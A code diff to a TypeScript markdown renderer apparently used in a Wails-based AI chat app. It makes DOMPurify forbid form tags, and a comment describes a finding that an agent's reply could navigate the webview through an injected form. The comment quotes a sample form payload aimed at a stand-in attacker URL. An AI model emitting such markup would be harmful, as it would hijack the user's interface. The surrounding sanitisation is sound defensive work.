@@ -102,7 +102,22 @@ export function renderMarkdown(src: string): string {
   const hit = cache.get(src);
   if (hit !== undefined) return hit;
   const raw = marked.parse(src, { async: false }) as string;
-  const clean = DOMPurify.sanitize(raw, { ADD_ATTR: ["target"] });
+  // Round 17 Sec M2: FORBID <form>. DOMPurify's default whitelist
+  // passes it, which lets an agent reply `<form action="https://attacker/x">
+  // <input/></form>` navigate the Wails webview's main frame on a
+  // stray Enter (default form-submit behavior, no event handler
+  // needed). Form CONTROLS (input/textarea/select/label) are allowed
+  // through — they're useful for genuine UI demos in markdown and
+  // Bubble.svelte's right-click bail-list already prevents them from
+  // stealing native Paste/Copy menus. Without an enclosing <form>
+  // they have no navigation power.
+  //
+  // We do NOT forbid <button> because the code-block renderer above
+  // emits its own <button class="cb-copy"> for the copy-code affordance.
+  const clean = DOMPurify.sanitize(raw, {
+    ADD_ATTR: ["target"],
+    FORBID_TAGS: ["form"],
+  });
   if (cache.size >= MAX) {
     const first = cache.keys().next().value;
     if (first !== undefined) cache.delete(first);
